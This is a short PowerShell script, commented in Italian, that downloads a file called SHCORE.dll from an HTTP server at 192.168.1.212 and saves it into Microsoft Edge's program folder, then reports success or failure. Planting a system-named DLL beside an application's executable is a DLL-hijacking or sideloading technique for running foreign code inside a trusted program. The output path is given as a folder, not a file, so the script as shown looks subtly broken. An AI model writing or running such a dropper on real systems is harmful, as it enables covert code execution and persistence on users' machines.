# Percorso in cui la DLL verrà posizionata
$targetPath = "C:\Program Files (x86)\Microsoft\Edge\Application"

# URL del server per il download della DLL
$downloadUrl = "http://192.168.1.212/SHCORE.dll"

# Scarica la DLL
Invoke-WebRequest -Uri $downloadUrl -OutFile $targetPath

# Controllo se il download è andato a buon fine
if (Test-Path -Path $targetPath) {
    Write-Output "DLL scaricata in $targetPath"
} else {
    Write-Output "Errore nel download della DLL"
}
